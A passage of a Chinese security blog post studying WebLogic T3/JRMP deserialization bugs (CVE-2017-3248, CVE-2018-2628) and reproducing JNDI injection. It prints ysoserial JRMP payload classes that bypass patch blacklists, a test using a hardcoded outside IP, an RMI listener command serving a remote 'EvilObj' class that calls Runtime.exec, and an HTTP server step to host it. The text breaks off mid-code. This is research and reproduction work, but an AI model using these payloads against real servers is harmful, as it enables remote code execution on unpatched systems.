<p>之后在<code>RemoteObject.readObject</code>上看一下，对里面的<code>RemoteObjectInvocationHandler.ref</code>，即<code>RemoteRef</code>进行了反序列化，通过判断<code>refClassName</code>，进入的是<code>else</code>路径，调用的是其<code>readExternal</code>函数，走的是上面红色的那条路，可以看到注释也说明了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230209163242665.png" alt="image-20230209163242665"></p>
<p>这个<code>ref</code>在之前的<code>payload</code>中看到的是</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UnicastRef ref = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(id, te, <span class="keyword">false</span>));</span><br><span class="line">RemoteObjectInvocationHandler obj = <span class="keyword">new</span> RemoteObjectInvocationHandler(ref);</span><br></pre></td></tr></table></div></figure>

<p>所以反序列化的是<code>UnicastRef</code>，其实现了<code>RemoteRef</code>接口，<code>RemoteRef</code>接口又实现了<code>Externalizable</code>接口，所以这里也能知道走的应该是红色路径。然后看看其反序列化函数，即<code>readExternal</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230209163615120.png" alt="image-20230209163615120"></p>
<p>调用其<code>read</code>函数，进行相关<code>IP/Port</code>的获取，然后进入到<code>registerRefs</code>函数，就是相关的<code>DGC(Distributed Garbage Collection)</code>分布式垃圾收集机制，可以参考，可以参考<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/322910.html" >攻击JavaRMI概述 - FreeBuf网络安全行业门户</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230209163831012.png" alt="image-20230209163831012"></p>
<p>不是很懂这个，就是进行一些相关注册之后，最后会在<code>jdk1.6.0_45/jre/lib/rt.jar!/sun.rmi.transport.DGCImpl_Stub#dirty</code>函数中调用到<code>RemoteRef.invoke</code>函数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230209165245896.png" alt="image-20230209165245896"></p>
<p>这里的<code>ref</code>就是那个<code>UnicastRef</code>了，然后就是这里的<code>invoke</code>函数了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230209175828791.png" alt="image-20230209175828791"></p>
<p>进入<code>excuteCall</code>函数，就是之前提到的，那么完整的分析就完成了，在<code>excuteCall</code>函数中通过如下代码</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var14 = this.in.readObject();</span><br></pre></td></tr></table></div></figure>

<p>完成远程对象的反序列化。</p>

        <h4 id="绕过CVE-2017-3248"   >
          <a href="#绕过CVE-2017-3248" class="heading-link"><i class="fas fa-link"></i></a><a href="#绕过CVE-2017-3248" class="headerlink" title="绕过CVE-2017-3248"></a>绕过CVE-2017-3248</h4>
      <p>继<code>CVE-2017-3248</code>之后，<code>CVE-2018-2628</code>生成的原因，就在于绕过了黑名单中对于<code>java.rmi.registry.Registry</code>的过滤，该过滤是放在<code>weblogic.rjvm.InboundMsgAbbrev#resolveProxyClass</code>中的。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208164502309.png" alt="image-20230208164502309"></p>
<p>而这个<code>resolveProxyClass</code>在前面那张廖师傅的图片也提到了，也是可以用来过滤的。</p>
<p>原漏洞作者绕过的方法是使用<code>java.rmi.activation.Activator</code>进行绕过，参考:<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/nYY4zg2m2xsqT0GXa9pMGA" >CVE-2018-2628 简单复现与分析</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，但是实际上，在反序列化时，这个接口根本就没有什么用处，所以随便一个接口都可以绕过，参考:<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/ikRBb4e8gMP8DtlpQlpYng" >weblogic历史T3反序列化漏洞及补丁梳理 (qq.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>比如上述<code>cL0und</code>师傅说的换成<code>Map</code>都可以的，如下代码所示</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings</span> ( &#123;</span><br><span class="line">    <span class="string">&quot;restriction&quot;</span></span><br><span class="line">&#125; )</span><br><span class="line"><span class="meta">@PayloadTest( harness=&quot;ysoserial.test.payloads.JRMPReverseConnectSMTest&quot;)</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.MBECHLER &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JRMPClient3</span> <span class="keyword">extends</span> <span class="title">PayloadRunner</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Map</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Map <span class="title">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        String host;</span><br><span class="line">        <span class="keyword">int</span> port;</span><br><span class="line">        <span class="keyword">int</span> sep = command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">            port = <span class="keyword">new</span> Random().nextInt(<span class="number">65535</span>);</span><br><span class="line">            host = command;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">            port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        ObjID id = <span class="keyword">new</span> ObjID(<span class="keyword">new</span> Random().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        TCPEndpoint te = <span class="keyword">new</span> TCPEndpoint(host, port);</span><br><span class="line">        UnicastRef ref = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(id, te, <span class="keyword">false</span>));</span><br><span class="line">        RemoteObjectInvocationHandler obj = <span class="keyword">new</span> RemoteObjectInvocationHandler(ref);</span><br><span class="line">        Map proxy = (Map) Proxy.newProxyInstance(</span><br><span class="line">            JRMPClient.class.getClassLoader(),</span><br><span class="line">            <span class="keyword">new</span> Class[] &#123; Map.class &#125;,</span><br><span class="line">            obj);</span><br><span class="line">        <span class="keyword">return</span> proxy;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Thread.currentThread().setContextClassLoader(JRMPClient.class.getClassLoader());</span><br><span class="line">        PayloadRunner.run(JRMPClient.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<ul>
<li><code>ysoserial</code>添加<code>payload</code></li>
</ul>
<p>这里再记录一下在<code>ysoserial</code>中添加<code>payload</code>。其实<code>git clone</code>下来用<code>IDEA</code>打开，等待<code>pom.xml</code>加载库，然后在<code>ysoserialsrc/main/java/ysoserial/payloads</code>中新建对应类放入即可，比如这里就放入<code>JRMPClient3</code>就行。最后再用如命令<code>mvn clean package -DskipTests</code>打包一下就能用。</p>
<p>接口是什么没有关系，实际上最本质的是<code>UnicastRef</code>这个对象就能建立远程连接并且获取信息。比如如下的<code>JRMPClient2</code></p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings</span> ( &#123;</span><br><span class="line">    <span class="string">&quot;restriction&quot;</span></span><br><span class="line">&#125; )</span><br><span class="line"><span class="meta">@PayloadTest( harness=&quot;ysoserial.test.payloads.JRMPReverseConnectSMTest&quot;)</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.MBECHLER &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JRMPClient2</span> <span class="keyword">extends</span> <span class="title">PayloadRunner</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">UnicastRef</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> UnicastRef <span class="title">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        String host;</span><br><span class="line">        <span class="keyword">int</span> port;</span><br><span class="line">        <span class="keyword">int</span> sep = command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">            port = <span class="keyword">new</span> Random().nextInt(<span class="number">65535</span>);</span><br><span class="line">            host = command;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">            port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        ObjID id = <span class="keyword">new</span> ObjID(<span class="keyword">new</span> Random().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        TCPEndpoint te = <span class="keyword">new</span> TCPEndpoint(host, port);</span><br><span class="line">        UnicastRef ref = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(id, te, <span class="keyword">false</span>));</span><br><span class="line">        <span class="keyword">return</span> ref;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Thread.currentThread().setContextClassLoader(JRMPClient.class.getClassLoader());</span><br><span class="line">        PayloadRunner.run(JRMPClient.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>在实际的调用栈如下，也能完成利用。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230209182117569.png" alt="image-20230209182117569"></p>
<p>此外由于<code>CVE-2017-3248</code>的补丁黑名单是添加到<code>resolveProxyClass</code>中，而对于<code>resolveProxyClass</code>而言，只要反序列化的对象没有<code>proxy</code>类的，那么<code>resolveProxyClass</code>就不会被调用到，那么其实只用<code>UnicastRef</code>的<code>payload</code>根本就不会碰到<code>CVE-2017-3248</code>的补丁黑名单过滤。</p>
<p>参考:<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2479" >Weblogic JRMP反序列化漏洞回顾 - 先知社区 (aliyun.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="漏洞修复-1"   >
          <a href="#漏洞修复-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3>
      <p>该<code>CVE-2018-2628</code>漏洞的修复最终添加的黑名单是<code>sun.rmi.server.UnicastRef</code>，放在<code>weblogic.utils.io.oif.WebLogicFilterConfig</code>中。</p>
<p>但是该漏洞的修复并没有用，因为在<code>UnicastRef</code>经过<code>RemoteObjectInvocationHandler</code>的封装后，其序列化和反序列化过程是在<code>RemoteObjectInvocationHandler</code>父类<code>RemoteObject</code>的<code>readObject/writeObject</code>中完成的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230209202440301.png" alt="image-20230209202440301"></p>
<p>所以当在<code>resovleClass</code>中获取类名尝试拦截时，获取到<code>RemoteObjectInvocationHandler</code>之后，下一个是获取不到<code>UnicastRef</code>的，因为<code>UnicastRef</code>已经在<code>RemoteObjectInvocationHandler</code>反序列化过程中完成了反序列化，所以该漏洞的补丁和没加一样的。</p>
<p>参考:<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2479" >Weblogic JRMP反序列化漏洞回顾 - 先知社区 (aliyun.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="疑问"   >
          <a href="#疑问" class="heading-link"><i class="fas fa-link"></i></a><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h3>
      <p>在调试进行序列化和反序列化的时候，我尝试在本地进行，如下代码</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.test.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">myTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Registry <span class="title">getObject</span> <span class="params">()</span></span>&#123;</span><br><span class="line">        String host = <span class="string">&quot;123.249.17.65&quot;</span>;</span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">9999</span>;</span><br><span class="line">        ObjID id = <span class="keyword">new</span> ObjID(<span class="keyword">new</span> Random().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        TCPEndpoint te = <span class="keyword">new</span> TCPEndpoint(host, port);</span><br><span class="line">        UnicastRef ref = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(id, te, <span class="keyword">false</span>));</span><br><span class="line">        RemoteObjectInvocationHandler obj = <span class="keyword">new</span> RemoteObjectInvocationHandler(ref);</span><br><span class="line">        Registry proxy = (Registry) Proxy.newProxyInstance(</span><br><span class="line">            myTest.class.getClassLoader(),</span><br><span class="line">            <span class="keyword">new</span> Class[] &#123;Registry.class&#125;,</span><br><span class="line">            obj);</span><br><span class="line">        <span class="keyword">return</span> proxy;</span><br><span class="line">        <span class="comment">//return ref;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> IOException, NotBoundException, ClassNotFoundException </span>&#123;</span><br><span class="line">        myTest test = <span class="keyword">new</span> myTest();</span><br><span class="line">        Registry testObj = test.getObject();</span><br><span class="line">        FileOutputStream fout = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;fileStream.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ObjectOutputStream 将 Java 对象的基本数据类型和图形写入 OutputStream。可以使用 ObjectInputStream 读取（重构）对象。</span></span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(fout);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//writeObject 方法负责写入特定类的对象状态，以便相应的 readObject 方法可以恢复它。</span></span><br><span class="line">        out.writeObject(testObj);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//FileInputStream 类从文件系统中的一个文件中获取输入字节。</span></span><br><span class="line">        FileInputStream fin = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;fileStream.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建从指定 InputStream 读取的 ObjectInputStream。从流读取序列化头部并予以验证。</span></span><br><span class="line">        ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(fin);</span><br><span class="line">        Registry unSerObj = (Registry) in.readObject();</span><br><span class="line"></span><br><span class="line">        System.out.println(testObj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>在开启了<code>JRMPListerner</code>之后，反序列化的过程中并没有命令执行，经过调试，最终也会走入到<code>executeCall</code>方法，但是总是没办法接收到远程的数据，而远程显示已经发送的数据，但是就是接收不到，不知道为什么。实际的调用栈其实也差不多</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230209183545852.png" alt="image-20230209183545852"></p>
<p>在本地调试时也会进入到<code>executeCall#var14 = this.in.readObject();</code></p>
<p>但是反序列化得到的结果不是想要的，水平比较菜，也没有找到反序列化的数据在哪里。寄寄。</p>
<p>但是实际上，如果在上述代码最后加上一个远程通信代码</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unSerObj.list();</span><br></pre></td></tr></table></div></figure>

<p>这样就可以得到命令执行，同样也是在<code>executeCall#var14 = this.in.readObject();</code>进行的反序列化得到命令执行，有点整不会了。<strong>mark一下</strong></p>

        <h2 id="JNDI注入"   >
          <a href="#JNDI注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2>
      <p>学到<code>Weblogic</code>的一些洞，发现其中的<code>JNDI</code>注入<code>(Java Naming and Directory Interface)</code>挺有意思，就来复现一下。</p>
<p>首先以<code>java1.6.0_45</code>为例子，比较原始一点，不涉及之后<code>JAVA</code>版本对于<code>JNDI</code>注入的一些限制</p>

        <h3 id="简单例子"   >
          <a href="#简单例子" class="heading-link"><i class="fas fa-link"></i></a><a href="#简单例子" class="headerlink" title="简单例子"></a>简单例子</h3>
      <p>做个简单<code>JNDI</code>的运行例子，画一下图更加清楚一点</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230210201304085.png" alt="image-20230210201304085"></p>

        <h4 id="server-register"   >
          <a href="#server-register" class="heading-link"><i class="fas fa-link"></i></a><a href="#server-register" class="headerlink" title="server/register"></a>server/register</h4>
      <p>直接就放在一起了，用<code>wh1t3p1g</code>师傅改版后的<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/wh1t3p1g/ysoserial" >ysoserial</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRefListener 1099 EvilObj http://LDAP_IP/</span><br></pre></td></tr></table></div></figure>

<p>这个<code>EvilObj</code>即代表在<code>LDAP</code>服务中的<code>EvilObj.class</code>，随便写点恶意代码就行</p>
<p>参考:<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/199481#h3-9" >JNDI with RMI-安全客 - 安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> wh1t3P1g</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2020/2/4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilObj</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EvilObj</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Runtime rt = Runtime.getRuntime();</span><br><span class="line">        String[] commands = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">        rt.exec(commands);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p><code>javac</code>编译生成的<code>EvilObj.class</code>，放在<code>LDAP</code>服务目录下即可</p>

        <h4 id="LDAP服务"   >
          <a href="#LDAP服务" class="heading-link"><i class="fas fa-link"></i></a><a href="#LDAP服务" class="headerlink" title="LDAP服务"></a>LDAP服务</h4>
      <p>这个直接开启<code>Web</code>服务就行，比如用<code>Python</code></p>
<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></div></figure>

<p>然后<code>Web</code>目录下得有上述的<code>EvilObj.class</code>，即<code>http://LDAP_IP/EvilObj.class</code>得访问下载到才行。</p>
<p>当然这个<code>LDAP</code>服务和上面的<code>server</code>放一起也行，用<code>wh1t3p1g</code>师傅改版后的<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/wh1t3p1g/ysoserial" >ysoserial</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>同样可以完成，但是师傅可能更改了一些代码，现在不太好使，也可能是自己方法不对。这里就自己写了一下，借助一下师傅的<code>PayloadClassFileHTTPServer</code>类，然后整合一下放到<code>ysoserial.exploit</code>里面就行</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.exploit;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.TransportConstants;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.ObjectPayload.Utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> 